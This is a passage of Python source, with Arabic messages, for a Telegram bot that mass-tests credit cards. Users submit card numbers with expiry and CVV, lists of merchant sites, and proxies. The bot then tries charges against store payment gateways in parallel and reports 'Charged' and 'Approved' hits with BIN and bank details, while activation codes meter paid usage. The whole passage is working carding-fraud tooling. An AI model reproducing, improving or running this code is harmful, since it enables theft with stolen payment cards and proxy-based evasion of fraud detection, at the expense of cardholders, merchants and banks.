        await event.reply(premium_emoji(f"<b>📋 بروكسياتك ({len(proxies)}):</b>\n\nالملف مرفق أدناه."), file=filename, parse_mode='html')
        try:
            os.remove(filename)
        except:
            pass

@bot.on(events.NewMessage(pattern=r'^/site\s+'))
async def add_site_command(event):
    user_id = event.sender_id
    if is_user_blocked(user_id) and not is_admin(user_id):
        await event.reply(premium_emoji("🚫 <b>لقد تم حظرك من استخدام هذا البوت.</b>"), parse_mode='html')
        return
    
    args = event.message.text.split(' ', 1)
    if len(args) < 2:
        await event.reply(premium_emoji("❌ الاستخدام: <code>/site https://domain.com</code>"), parse_mode='html')
        return
    site = args[1].strip()
    site = site.replace('https://', '').replace('http://', '').rstrip('/')
    
    proxies = load_user_proxies(user_id)
    if not proxies:
        await event.reply(premium_emoji("❌ لا توجد بروكسيات. أضف بروكسيات أولاً باستخدام /addproxy"), parse_mode='html')
        return
    
    status_msg = await event.reply(premium_emoji(f"🔄 جاري اختبار الموقع: {site}..."), parse_mode='html')
    proxy = random.choice(proxies)
    result = await test_site(site, proxy)
    
    if result['status'] == 'alive':
        current_sites = load_user_sites(user_id)
        if site not in current_sites:
            new_sites = current_sites + [site]
            save_user_sites(user_id, new_sites)
            await status_msg.edit(premium_emoji(f"✅ <b>تمت إضافة الموقع بنجاح!</b>\n\n{site}"), parse_mode='html')
        else:
            await status_msg.edit(premium_emoji(f"⚠️ <b>الموقع موجود بالفعل:</b> {site}"), parse_mode='html')
    else:
        await status_msg.edit(premium_emoji(f"❌ <b>لا يمكن إضافة الموقع!</b>\n\nالموقع يبدو معطلاً أو لا يمكن الوصول إليه."), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/rmsite\s+'))
async def remove_site_command(event):
    user_id = event.sender_id
    if is_user_blocked(user_id) and not is_admin(user_id):
        await event.reply(premium_emoji("🚫 <b>لقد تم حظرك من استخدام هذا البوت.</b>"), parse_mode='html')
        return
    
    args = event.message.text.split(' ', 1)
    if len(args) < 2:
        await event.reply(premium_emoji("❌ الاستخدام: <code>/rmsite https://domain.com</code>"), parse_mode='html')
        return
    url_to_remove = args[1].strip()
    current_sites = load_user_sites(user_id)
    if url_to_remove not in current_sites:
        await event.reply(premium_emoji(f"❌ الموقع غير موجود: {url_to_remove}"), parse_mode='html')
        return
    new_sites = [site for site in current_sites if site != url_to_remove]
    save_user_sites(user_id, new_sites)
    await event.reply(premium_emoji(f"✅ <b>تم حذف الموقع بنجاح!</b>\n\n{url_to_remove}"), parse_mode='html')

@bot.on(events.NewMessage(pattern='/sitecheck'))
async def site_check_command(event):
    user_id = event.sender_id
    if is_user_blocked(user_id) and not is_admin(user_id):
        await event.reply(premium_emoji("🚫 <b>لقد تم حظرك من استخدام هذا البوت.</b>"), parse_mode='html')
        return
    
    sites = load_user_sites(user_id)
    if not sites:
        await event.reply(premium_emoji("❌ لا توجد مواقع للفحص."), parse_mode='html')
        return
    proxies = load_user_proxies(user_id)
    if not proxies:
        await event.reply(premium_emoji("❌ لا توجد بروكسيات."), parse_mode='html')
        return
    status_msg = await event.reply(premium_emoji(f"🔥 جاري فحص {len(sites)} موقع..."), parse_mode='html')
    alive_sites = []
    dead_sites = []
    batch_size = 10
    for i in range(0, len(sites), batch_size):
        batch = sites[i:i + batch_size]
        fresh_proxies = load_user_proxies(user_id)
        if not fresh_proxies:
            fresh_proxies = proxies
        tasks = [test_site(site, random.choice(fresh_proxies)) for site in batch]
        results = await asyncio.gather(*tasks)
        for res in results:
            if res['status'] == 'alive':
                alive_sites.append(res['site'])
            else:
                dead_sites.append(res['site'])
        await status_msg.edit(premium_emoji(f"🔥 جاري فحص المواقع...\n\n<b>تم الفحص:</b> {len(alive_sites) + len(dead_sites)}/{len(sites)}\n<b>شغال:</b> {len(alive_sites)}\n<b>ميت:</b> {len(dead_sites)}"), parse_mode='html')
    save_user_sites(user_id, alive_sites)
    summary = f"""✅ <b>اكتمل فحص المواقع!</b>

<b>إجمالي المواقع:</b> {len(sites)}
<b>الشغالة:</b> {len(alive_sites)}
<b>المحذوفة:</b> {len(dead_sites)}

تم تحديث قائمة المواقع بالمواقع الشغالة فقط."""
    await status_msg.edit(premium_emoji(summary), parse_mode='html')

@bot.on(events.NewMessage(pattern='/addsites'))
async def add_sites_file_command(event):
    user_id = event.sender_id
    if is_user_blocked(user_id) and not is_admin(user_id):
        await event.reply(premium_emoji("🚫 <b>لقد تم حظرك من استخدام هذا البوت.</b>"), parse_mode='html')
        return
    
    if not event.reply_to_msg_id:
        await event.reply(premium_emoji("❌ قم بالرد على ملف .txt يحتوي على المواقع."), parse_mode='html')
        return
    reply_msg = await event.get_reply_message()
    if not reply_msg.file or not reply_msg.file.name.endswith('.txt'):
        await event.reply(premium_emoji("❌ قم بالرد على ملف .txt."), parse_mode='html')
        return
    status_msg = await event.reply(premium_emoji("🔄 جاري معالجة الملف..."), parse_mode='html')
    file_path = await reply_msg.download_media()
    async with aiofiles.open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
        content = await f.read()
    sites = [line.strip() for line in content.split('\n') if line.strip()]
    sites = [s.replace('https://', '').replace('http://', '').rstrip('/') for s in sites]
    if not sites:
        await status_msg.edit(premium_emoji("❌ لا توجد مواقع صالحة في الملف."), parse_mode='html')
        os.remove(file_path)
        return
    os.remove(file_path)
    current_sites = load_user_sites(user_id)
    new_sites = [s for s in sites if s not in current_sites]
    if not new_sites:
        await status_msg.edit(premium_emoji("⚠️ جميع المواقع موجودة بالفعل."), parse_mode='html')
        return
    
    # إضافة المواقع مباشرة بدون فحص
    all_sites = list(set(current_sites + sites))
    save_user_sites(user_id, all_sites)
    await status_msg.edit(premium_emoji(f"✅ <b>تمت الإضافة!</b>\n\nتمت إضافة {len(new_sites)} موقع جديد.\nإجمالي المواقع: {len(all_sites)}\n\nللفحص استخدم /sitecheck"), parse_mode='html')

@bot.on(events.NewMessage(pattern='/addproxy'))
async def add_proxy_command(event):
    user_id = event.sender_id
    if is_user_blocked(user_id) and not is_admin(user_id):
        await event.reply(premium_emoji("🚫 <b>لقد تم حظرك من استخدام هذا البوت.</b>"), parse_mode='html')
        return
    try:
        args = event.message.text.split('\n')
        if len(args) < 2:
            await event.reply(premium_emoji("❌ الاستخدام: <code>/addproxy</code> ثم كتابة البروكسيات سطراً بسطر."), parse_mode='html')
            return
        proxies_to_add = [line.strip() for line in args[1:] if line.strip()]
        if not proxies_to_add:
            await event.reply(premium_emoji("❌ لم يتم إدخال أي بروكسي."), parse_mode='html')
            return
        current_proxies = load_user_proxies(user_id)
        new_proxies = []
        for proxy in proxies_to_add:
            if proxy not in current_proxies:
                new_proxies.append(proxy)
        if not new_proxies:
            await event.reply(premium_emoji("⚠️ جميع البروكسيات موجودة بالفعل."), parse_mode='html')
            return
        async with aiofiles.open(get_user_proxy_file(user_id), 'a') as f:
            for proxy in new_proxies:
                await f.write(f"{proxy}\n")
        await event.reply(premium_emoji(f"✅ <b>تمت إضافة البروكسيات!</b>\n\nتمت إضافة {len(new_proxies)} بروكسي جديد."), parse_mode='html')
    except Exception as e:
        await event.reply(premium_emoji(f"❌ خطأ: {e}"), parse_mode='html')

@bot.on(events.NewMessage(pattern='/addproxies'))
async def add_proxies_file_command(event):
    user_id = event.sender_id
    if is_user_blocked(user_id) and not is_admin(user_id):
        await event.reply(premium_emoji("🚫 <b>لقد تم حظرك من استخدام هذا البوت.</b>"), parse_mode='html')
        return
    if not event.reply_to_msg_id:
        await event.reply(premium_emoji("❌ قم بالرد على ملف .txt يحتوي على البروكسيات."), parse_mode='html')
        return
    reply_msg = await event.get_reply_message()
    if not reply_msg.file or not reply_msg.file.name.endswith('.txt'):
        await event.reply(premium_emoji("❌ قم بالرد على ملف .txt."), parse_mode='html')
        return
    status_msg = await event.reply(premium_emoji("🔄 جاري معالجة الملف..."), parse_mode='html')
    file_path = await reply_msg.download_media()
    async with aiofiles.open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
        content = await f.read()
    proxies = [line.strip() for line in content.split('\n') if line.strip()]
    if not proxies:
        await status_msg.edit(premium_emoji("❌ لا توجد بروكسيات صالحة في الملف."), parse_mode='html')
        os.remove(file_path)
        return
    os.remove(file_path)
    current_proxies = load_user_proxies(user_id)
    new_proxies = [p for p in proxies if p not in current_proxies]
    if new_proxies:
        async with aiofiles.open(get_user_proxy_file(user_id), 'a') as f:
            for proxy in new_proxies:
                await f.write(f"{proxy}\n")
    await status_msg.edit(premium_emoji(f"✅ <b>تمت الإضافة!</b>\n\nتمت إضافة {len(new_proxies)} بروكسي جديد.\nإجمالي البروكسيات: {len(current_proxies) + len(new_proxies)}"), parse_mode='html')

@bot.on(events.NewMessage(pattern='/chkproxy'))
async def check_single_proxy_command(event):
    user_id = event.sender_id
    if is_user_blocked(user_id) and not is_admin(user_id):
        await event.reply(premium_emoji("🚫 <b>لقد تم حظرك من استخدام هذا البوت.</b>"), parse_mode='html')
        return
    proxy = event.message.text.split(' ', 1)[1].strip() if len(event.message.text.split()) > 1 else None
    if not proxy:
        await event.reply(premium_emoji("❌ الاستخدام: <code>/chkproxy ip:port:user:pass</code>"), parse_mode='html')
        return
    status_msg = await event.reply(premium_emoji(f"🔄 جاري فحص البروكسي: <code>{proxy}</code>..."), parse_mode='html')
    try:
        result = await test_proxy(proxy)
        if result['status'] == 'alive':
            await status_msg.edit(premium_emoji(f"✅ <b>البروكسي شغال!</b>\n\n<code>{proxy}</code>"), parse_mode='html')
        else:
            await status_msg.edit(premium_emoji(f"❌ <b>البروكسي ميت!</b>\n\n<code>{proxy}</code>"), parse_mode='html')
    except Exception as e:
        await status_msg.edit(premium_emoji(f"❌ خطأ: {e}"), parse_mode='html')

@bot.on(events.NewMessage(pattern='/rmproxy'))
async def remove_single_proxy_command(event):
    user_id = event.sender_id
    if is_user_blocked(user_id) and not is_admin(user_id):
        await event.reply(premium_emoji("🚫 <b>لقد تم حظرك من استخدام هذا البوت.</b>"), parse_mode='html')
        return
    proxy_to_remove = event.message.text.split(' ', 1)[1].strip() if len(event.message.text.split()) > 1 else None
    if not proxy_to_remove:
        await event.reply(premium_emoji("❌ الاستخدام: <code>/rmproxy ip:port:user:pass</code>"), parse_mode='html')
        return
    current_proxies = load_user_proxies(user_id)
    if proxy_to_remove not in current_proxies:
        await event.reply(premium_emoji(f"❌ البروكسي غير موجود: <code>{proxy_to_remove}</code>"), parse_mode='html')
        return
    new_proxies = [p for p in current_proxies if p != proxy_to_remove]
    save_user_proxies(user_id, new_proxies)
    await event.reply(premium_emoji(f"✅ <b>تم حذف البروكسي!</b>\n\n<code>{proxy_to_remove}</code>"), parse_mode='html')

@bot.on(events.NewMessage(pattern='/clearproxy'))
async def clear_proxies_command(event):
    user_id = event.sender_id
    if is_user_blocked(user_id) and not is_admin(user_id):
        await event.reply(premium_emoji("🚫 <b>لقد تم حظرك من استخدام هذا البوت.</b>"), parse_mode='html')
        return
    current_proxies = load_user_proxies(user_id)
    count = len(current_proxies)
    if count == 0:
        await event.reply(premium_emoji("❌ لا توجد بروكسيات لحذفها."), parse_mode='html')
        return
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    backup_filename = f"proxy_backup_{user_id}_{timestamp}.txt"
    try:
        async with aiofiles.open(backup_filename, 'w') as f:
            for proxy in current_proxies:
                await f.write(f"{proxy}\n")
        await event.reply(premium_emoji(f"📦 <b>تم إنشاء نسخة احتياطية!</b>\n\nتم إرفاق نسخة احتياطية من {count} بروكسي."), file=backup_filename, parse_mode='html')
        try:
            os.remove(backup_filename)
        except:
            pass
    except Exception as e:
        await event.reply(premium_emoji(f"❌ خطأ في إنشاء النسخة الاحتياطية: {e}"), parse_mode='html')
        return
    save_user_proxies(user_id, [])
    await event.reply(premium_emoji(f"✅ <b>تم حذف جميع البروكسيات ({count})!</b>\n\nملف البروكسيات أصبح فارغاً الآن."), parse_mode='html')

@bot.on(events.NewMessage(pattern='/proxy'))
async def proxy_check_command(event):
    user_id = event.sender_id
    if is_user_blocked(user_id) and not is_admin(user_id):
        await event.reply(premium_emoji("🚫 <b>لقد تم حظرك من استخدام هذا البوت.</b>"), parse_mode='html')
        return
    proxies = load_user_proxies(user_id)
    if not proxies:
        await event.reply(premium_emoji("❌ لا توجد بروكسيات للفحص."), parse_mode='html')
        return
    status_msg = await event.reply(premium_emoji(f"🔥 جاري فحص {len(proxies)} بروكسي..."), parse_mode='html')
    alive_proxies = []
    dead_proxies = []
    batch_size = 50
    for i in range(0, len(proxies), batch_size):
        batch = proxies[i:i + batch_size]
        tasks = [test_proxy(proxy) for proxy in batch]
        results = await asyncio.gather(*tasks)
        for res in results:
            if res['status'] == 'alive':
                alive_proxies.append(res['proxy'])
            else:
                dead_proxies.append(res['proxy'])
        await status_msg.edit(premium_emoji(f"🔥 جاري فحص البروكسيات...\n\n<b>تم الفحص:</b> {len(alive_proxies) + len(dead_proxies)}/{len(proxies)}\n<b>شغال:</b> {len(alive_proxies)}\n<b>ميت:</b> {len(dead_proxies)}"), parse_mode='html')
    save_user_proxies(user_id, alive_proxies)
    summary = f"""✅ <b>اكتمل فحص البروكسيات!</b>

<b>إجمالي البروكسيات:</b> {len(proxies)}
<b>الشغالة:</b> {len(alive_proxies)}
<b>المحذوفة:</b> {len(dead_proxies)}

تم تحديث قائمة البروكسيات بالبروكسيات الشغالة فقط."""
    await status_msg.edit(premium_emoji(summary), parse_mode='html')

@bot.on(events.NewMessage(pattern='/getproxy'))
async def get_proxies_command(event):
    user_id = event.sender_id
    if is_user_blocked(user_id) and not is_admin(user_id):
        await event.reply(premium_emoji("🚫 <b>لقد تم حظرك من استخدام هذا البوت.</b>"), parse_mode='html')
        return
    proxies = load_user_proxies(user_id)
    if not proxies:
        await event.reply(premium_emoji("❌ لا توجد بروكسيات."), parse_mode='html')
        return
    if len(proxies) <= 50:
        proxy_list = "\n".join([f"{i+1}. <code>{p}</code>" for i, p in enumerate(proxies)])
        await event.reply(premium_emoji(f"<b>📋 جميع البروكسيات ({len(proxies)}):</b>\n\n{proxy_list}"), parse_mode='html')
    else:
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"proxies_{user_id}_{timestamp}.txt"
        async with aiofiles.open(filename, 'w') as f:
            for i, proxy in enumerate(proxies):
                await f.write(f"{i+1}. {proxy}\n")
        await event.reply(premium_emoji(f"<b>📋 جميع البروكسيات ({len(proxies)}):</b>\n\nالملف مرفق أدناه."), file=filename, parse_mode='html')
        try:
            os.remove(filename)
        except:
            pass

@bot.on(events.NewMessage(pattern='/mcancel'))
async def cancel_check_command(event):
    user_id = event.sender_id
    canceled = False
    for session_key in list(active_sessions.keys()):
        if session_key.startswith(f"{user_id}_"):
            del active_sessions[session_key]
            canceled = True
    if user_id in user_current_check:
        del user_current_check[user_id]
        canceled = True
    if canceled:
        await event.reply(premium_emoji("✅ <b>تم إلغاء الفحص!</b>"), parse_mode='html')
    else:
        await event.reply(premium_emoji("❌ لا يوجد فحص قيد التنفيذ"), parse_mode='html')

# ==================== فحص كارت واحد (سينجل) ====================

@bot.on(events.NewMessage(pattern=r'^/cc\s+'))
async def single_cc_check(event):
    user_id = event.sender_id
    
    if is_user_blocked(user_id) and not is_admin(user_id):
        await event.reply(premium_emoji("🚫 <b>لقد تم حظرك من استخدام هذا البوت.</b>"), parse_mode='html')
        return
    
    if user_id in user_current_check and user_current_check[user_id]:
        await event.reply(premium_emoji("⏳ <b>لديك فحص قيد التنفيذ حالياً. انتظر حتى يكتمل.</b>"), parse_mode='html')
        return
    
    sites = load_user_sites(user_id)
    proxies = load_user_proxies(user_id)
    
    if not sites:
        await event.reply(premium_emoji("❌ لا توجد مواقع. أضف مواقع أولاً باستخدام /site أو /addsites"), parse_mode='html')
        return
    if not proxies:
        await event.reply(premium_emoji("❌ لا توجد بروكسيات. أضف بروكسيات أولاً باستخدام /addproxy أو /addproxies"), parse_mode='html')
        return
    
    parts = event.message.text.split(maxsplit=1)
    if len(parts) < 2:
        await event.reply(premium_emoji("❌ صيغة غير صالحة. استخدم: `/cc 4242424242424242|12|25|123`"), parse_mode='html')
        return
    
    cc_input = parts[1].strip()
    cards = extract_cc(cc_input)
    
    if not cards:
        await event.reply(premium_emoji("❌ صيغة CC غير صالحة. استخدم: <code>/cc card|mm|yy|cvv</code>"), parse_mode='html')
        return
    
    card = cards[0]
    user_current_check[user_id] = True
    
    status_msg = await event.reply(
        premium_emoji(f"<b>⚡ جاري الفحص...</b>\n\n<blockquote>💳 البطاقة: <code>{card}</code></blockquote>\n"),
        parse_mode='html'
    )
    
    try:
        result = await check_card_with_retry(card, sites, proxies, max_retries=3)
        
        if not is_admin(user_id):
            increment_user_checks(user_id, 1)
        
        brand, bin_type, level, bank, country, flag = await get_bin_info(card.split('|')[0])
        
        if result['status'] == 'Charged':
            status_emoji = "💎"
            status_text = "𝐂𝐇𝐀𝐑𝐆𝐄𝐃"
            await send_hit_message(user_id, result, 'Charged')
        elif result['status'] == 'Approved':
            status_emoji = "✅"
            status_text = "𝐀𝐏𝐏𝐑𝐎𝐕𝐄𝐃 (Insufficient Funds)"
            await send_hit_message(user_id, result, 'Approved')
        else:
            status_emoji = "❌"
            status_text = "𝐃𝐄𝐂𝐋𝐈𝐍𝐄𝐃"
        
        checks_left_display = get_user_checks_left(user_id) if not is_admin(user_id) else "♾️"
        
        final_resp = f"""<b>━━━━━━━━━━━━━━━━━</b>
<b>💠 النتيجة</b>
<blockquote>{status_emoji} الحالة: {status_text}</blockquote>
<blockquote>💳 البطاقة: <code>{result['card']}</code></blockquote>
<blockquote>🌐 المتجر: <code>{result.get('site', 'Unknown')}</code></blockquote>
<blockquote>📝 الرد: {result['message'][:150]}</blockquote>
<blockquote>🌐 البوابة: 🔥 {result.get('gateway', 'Unknown')} | 💰 {result.get('price', '-')}</blockquote>
<b>💠 معلومات BIN</b>
<pre>𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {brand} - {bin_type} - {level}
𝗕𝗮𝗻𝗸: {bank}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country} {flag}</pre>
<b>💳 العمليات المتبقية: {checks_left_display}</b>"""
        
        await status_msg.edit(premium_emoji(final_resp), parse_mode='html')
        await asyncio.sleep(5)
        
    except Exception as e:
        print(f"[ERROR] Exception in single_cc_check: {e}")
        await status_msg.edit(premium_emoji(f"❌ خطأ في فحص البطاقة: {e}"), parse_mode='html')
    finally:
        user_current_check[user_id] = False

# ==================== فحص جماعي (كومبو) ====================

@bot.on(events.NewMessage(pattern='/chk'))
async def mass_check_command(event):
    user_id = event.sender_id
    
    if is_user_blocked(user_id) and not is_admin(user_id):
        await event.reply(premium_emoji("🚫 <b>لقد تم حظرك من استخدام هذا البوت.</b>"), parse_mode='html')
        return
    
    if user_id in user_current_check and user_current_check[user_id]:
        await event.reply(premium_emoji("⏳ <b>لديك فحص قيد التنفيذ حالياً. انتظر حتى يكتمل.</b>"), parse_mode='html')
        return
    
    if not event.reply_to_msg_id:
        await event.reply(premium_emoji("❌ قم بالرد على ملف .txt يحتوي على الكروت."), parse_mode='html')
        return
    
    reply_msg = await event.get_reply_message()
    if not reply_msg.file or not reply_msg.file.name.endswith('.txt'):
        await event.reply(premium_emoji("❌ قم بالرد على ملف .txt."), parse_mode='html')
        return
    
    sites = load_user_sites(user_id)
    proxies = load_user_proxies(user_id)
    
    if not sites:
        await event.reply(premium_emoji("❌ لا توجد مواقع. أضف مواقع أولاً."), parse_mode='html')
        return
    if not proxies:
        await event.reply(premium_emoji("❌ لا توجد بروكسيات. أضف بروكسيات أولاً."), parse_mode='html')
        return
    
    status_msg = await event.reply(premium_emoji("🔄 جاري معالجة ملفك..."), parse_mode='html')
    
    file_path = await reply_msg.download_media()
    
    async with aiofiles.open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
        content = await f.read()
    
    cards = extract_cc(content)
    
    if not cards:
        await status_msg.edit(premium_emoji("❌ لا توجد كروت صالحة في الملف."), parse_mode='html')
        os.remove(file_path)
        return
    
    max_cards = 100000 if is_admin(user_id) else 1000
    if len(cards) > max_cards:
        await status_msg.edit(premium_emoji(f"⚠️ الملف يحتوي على {len(cards)} كارت. سيتم فحص أول {max_cards} كارت."), parse_mode='html')
        cards = cards[:max_cards]
    
    os.remove(file_path)
    
    total_cards = len(cards)
    await status_msg.edit(premium_emoji(f"🔄 بدء فحص {total_cards} كارت..."), parse_mode='html')
    
    user_current_check[user_id] = True
    
    session_key = f"{user_id}_{status_msg.id}"
    active_sessions[session_key] = {'paused': False}
    
    all_results = {
        'charged': [],
        'approved': [],
        'dead': [],
        'total': total_cards,
        'checked': 0,
        'start_time': time.time()
    }
    
    card_responses = []
    
    try:
        queue = asyncio.Queue()
        for card in cards:
            queue.put_nowait(card)
            
        last_update_time = [time.time()]
        
        async def worker():
            while not queue.empty() and session_key in active_sessions:
                session_state = active_sessions.get(session_key)
                if not session_state:
                    break
                while session_state.get('paused', False):
                    await asyncio.sleep(1)
                    session_state = active_sessions.get(session_key)
                    if not session_state:
                        return
                        
                try:
                    card = queue.get_nowait()
                except asyncio.QueueEmpty:
                    break
                    
                current_sites = load_user_sites(user_id)
                current_proxies = load_user_proxies(user_id)
                if not current_sites or not current_proxies:
                    break
                
                res = await check_card_with_retry(card, current_sites, current_proxies, max_retries=1)
                
                all_results['checked'] += 1
                
                if not is_admin(user_id):
                    increment_user_checks(user_id, 1)
                
                card_responses.append({
                    'card': card,
                    'status': res['status'],
                    'message': res['message'],
                    'price': res.get('price', '-'),
                    'gateway': res.get('gateway', 'Unknown'),
                    'site': res.get('site', 'Unknown')
                })
                
                if res['status'] == 'Charged':
                    all_results['charged'].append(res)
                    await send_hit_message(user_id, res, 'Charged')
                elif res['status'] == 'Approved':
                    all_results['approved'].append(res)
                    await send_hit_message(user_id, res, 'Approved')
                else:
                    all_results['dead'].append(res)
                    
                queue.task_done()
                
                now = time.time()
                if now - last_update_time[0] >= 1.0:
                    last_update_time[0] = now
                    if session_key in active_sessions:
                        try:
                            elapsed = int(time.time() - all_results['start_time'])
                            hours = elapsed // 3600
                            minutes = (elapsed % 3600) // 60
                            seconds = elapsed % 60
                            
                            gateway = all_results['charged'][0]['gateway'] if all_results['charged'] else (all_results['approved'][0]['gateway'] if all_results['approved'] else 'Unknown')
                            
                            recent_responses = ""
                            for cr in card_responses[-5:]:
                                if cr['status'] == 'Charged':
                                    emoji = "💎"
                                elif cr['status'] == 'Approved':
                                    emoji = "✅"
                                else:
                                    emoji = "❌"
                                short_card = cr['card'][:10] + "***" + cr['card'][-4:] if len(cr['card']) > 15 else cr['card']
                                recent_responses += f"{emoji} {short_card} | {cr['message'][:30]} | {cr['site']}\n"
                            
                            progress_text = f"""
<b>💠 التقدم</b>
<blockquote>💳 الإجمالي: {all_results['total']} | 💎 Charged: {len(all_results['charged'])} | ✅ Approved: {len(all_results['approved'])} | ❌ Dead: {len(all_results['dead'])}</blockquote>
<blockquote>📊 تم الفحص: {all_results['checked']}/{all_results['total']}</blockquote>
<blockquote>🌐 البوابة: 🔥 {gateway}</blockquote>
<blockquote>⏱️ الوقت: {hours}h {minutes}m {seconds}s</blockquote>
<b>━━━━━━━━━━━━━━━━━</b>
<b>📝 آخر الردود:</b>
<code>{recent_responses}</code>
<b>━━━━━━━━━━━━━━━━━</b>
"""
                            await bot.edit_message(user_id, status_msg.id, premium_emoji(progress_text), buttons=[
                                [Button.inline("⏸️ إيقاف", b"pause"), Button.inline("▶️ استمرار", b"resume")],
                                [Button.inline("🛑 إلغاء", b"stop")]
                            ], parse_mode='html')
                        except Exception as e:
                            print(f"Error updating progress: {e}")
        
        workers = [asyncio.create_task(worker()) for _ in range(10)]
        
        while workers:
            if session_key not in active_sessions:
                for w in workers:
                    if not w.done():
                        w.cancel()
                break
            done, pending = await asyncio.wait(workers, timeout=1.0)
            workers = list(pending)
        
        if session_key in active_sessions:
            elapsed = int(time.time() - all_results['start_time'])
            hours = elapsed // 3600
            minutes = (elapsed % 3600) // 60
            seconds = elapsed % 60
            
            hits_text = ""
            if all_results['charged']:
                for r in all_results['charged'][:10]:
                    hits_text += f"💎 <code>{r['card']}</code> | {r.get('site', 'Unknown')} | {r.get('price', '-')}\n"
            if all_results['approved']:
                for r in all_results['approved'][:10]:
                    hits_text += f"✅ <code>{r['card']}</code> | {r.get('site', 'Unknown')} | {r.get('price', '-')}\n"
            
            if not hits_text:
                hits_text = "لا توجد نتائج"
            
            gateway = all_results['charged'][0]['gateway'] if all_results['charged'] else (all_results['approved'][0]['gateway'] if all_results['approved'] else 'Unknown')
            
            checks_left_display = get_user_checks_left(user_id) if not is_admin(user_id) else "♾️"
            
            summary = f"""<b>━━━━━━━━━━━━━━━━━</b>
<b>⚡ النتائج النهائية</b>
<blockquote>💳 الإجمالي: {all_results['total']} | 💎 Charged: {len(all_results['charged'])} | ✅ Approved: {len(all_results['approved'])} | ❌ Dead: {len(all_results['dead'])}</blockquote>
<blockquote>🌐 البوابة: 🔥 {gateway}</blockquote>
<blockquote>⏱️ الوقت: {hours}h {minutes}m {seconds}s</blockquote>
<b>━━━━━━━━━━━━━━━━━</b>
<b>💠 النتائج</b>
<blockquote>{hits_text}</blockquote>
<b>━━━━━━━━━━━━━━━━━</b>
<b>💳 العمليات المتبقية: {checks_left_display}</b>"""
            
            await bot.edit_message(user_id, status_msg.id, premium_emoji(summary), parse_mode='html')
        
    except Exception as e:
        print(f"[ERROR] Mass check error: {e}")
        await bot.send_message(user_id, premium_emoji(f"❌ حدث خطأ: {e}"), parse_mode='html')
    finally:
        if session_key in active_sessions:
            del active_sessions[session_key]
        user_current_check[user_id] = False

# ==================== أوامر الأدمن ====================

@bot.on(events.NewMessage(pattern='/admin'))
async def admin_panel(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        await event.reply(premium_emoji("❌ <b>هذا الأمر للأدمن فقط.</b>"), parse_mode='html')
        return
    stats_text = """<b>👑 لوحة تحكم الأدمن</b>

استخدم الأزرار أدناه أو الأوامر المباشرة:

├ <code>/gencode عدد</code> - إنشاء كود تفعيل
├ <code>/block معرف</code> - حظر مستخدم
├ <code>/unblock معرف</code> - إلغاء حظر
├ <code>/broadcast نص</code> - إذاعة رسالة
├ <code>/setlimit معرف عدد</code> - تعديل الحد الأقصى
├ <code>/users</code> - عرض المستخدمين
├ <code>/user معرف</code> - عرض بيانات مستخدم
└ <code>/stats</code> - إحصائيات البوت"""
    await event.reply(premium_emoji(stats_text), buttons=get_admin_menu_keyboard(), parse_mode='html')

@bot.on(events.NewMessage(pattern='/gencode'))
async def generate_code_command(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        await event.reply(premium_emoji("❌ <b>هذا الأمر للأدمن فقط.</b>"), parse_mode='html')
        return
    args = event.message.text.split()
    checks_limit = DEFAULT_CHECK_LIMIT
    if len(args) >= 2:
        try:
            checks_limit = int(args[1])
        except:
            await event.reply(premium_emoji("❌ <b>عدد غير صالح. استخدم رقم.</b>"), parse_mode='html')
            return
    code = create_activation_code(checks_limit)
    await event.reply(premium_emoji(f"✅ <b>تم إنشاء الكود!</b>\n\nالكود: <code>{code}</code>\nعدد الفحوصات: {checks_limit}\n\nيمكن للمستخدم استخدام: <code>/redeem {code}</code>"), parse_mode='html')

@bot.on(events.NewMessage(pattern='/block'))
async def block_user_command(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        await event.reply(premium_emoji("❌ <b>هذا الأمر للأدمن فقط.</b>"), parse_mode='html')
        return
    args = event.message.text.split()
    if len(args) < 2:
        await event.reply(premium_emoji("❌ الاستخدام: <code>/block معرف_المستخدم</code>"), parse_mode='html')
        return
    target_id = int(args[1])
    block_user(target_id)
    await event.reply(premium_emoji(f"✅ <b>تم حظر المستخدم {target_id}</b>"), parse_mode='html')

@bot.on(events.NewMessage(pattern='/unblock'))
async def unblock_user_command(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        await event.reply(premium_emoji("❌ <b>هذا الأمر للأدمن فقط.</b>"), parse_mode='html')
        return
    args = event.message.text.split()
    if len(args) < 2:
        await event.reply(premium_emoji("❌ الاستخدام: <code>/unblock معرف_المستخدم</code>"), parse_mode='html')
        return
    target_id = int(args[1])
    unblock_user(target_id)
    await event.reply(premium_emoji(f"✅ <b>تم إلغاء حظر المستخدم {target_id}</b>"), parse_mode='html')

@bot.on(events.NewMessage(pattern='/broadcast'))
async def broadcast_command(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        await event.reply(premium_emoji("❌ <b>هذا الأمر للأدمن فقط.</b>"), parse_mode='html')
        return
    args = event.message.text.split(maxsplit=1)
    if len(args) < 2:
        await event.reply(premium_emoji("❌ الاستخدام: <code>/broadcast الرسالة</code>"), parse_mode='html')
        return
    message_text = args[1]
    users = get_all_users()
    total = len(users)
    success = 0
    status_msg = await event.reply(premium_emoji(f"📢 جاري الإذاعة إلى {total} مستخدم..."), parse_mode='html')
    for user_id_str, user_data in users.items():
        try:
            await bot.send_message(int(user_id_str), premium_emoji(f"📢 <b>إذاعة من الأدمن</b>\n\n{message_text}"), parse_mode='html')
            success += 1
            await asyncio.sleep(0.5)
        except:
            pass
    await status_msg.edit(premium_emoji(f"✅ <b>تمت الإذاعة!</b>\n\nتم الإرسال إلى {success} من {total} مستخدم."), parse_mode='html')

@bot.on(events.NewMessage(pattern='/setlimit'))
async def set_limit_command(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        await event.reply(premium_emoji("❌ <b>هذا الأمر للأدمن فقط.</b>"), parse_mode='html')
        return
    args = event.message.text.split()
    if len(args) < 3:
        await event.reply(premium_emoji("❌ الاستخدام: <code>/setlimit معرف_المستخدم عدد_الفحوصات</code>"), parse_mode='html')
        return
    target_id = int(args[1])
    try:
        new_limit = int(args[2])
    except:
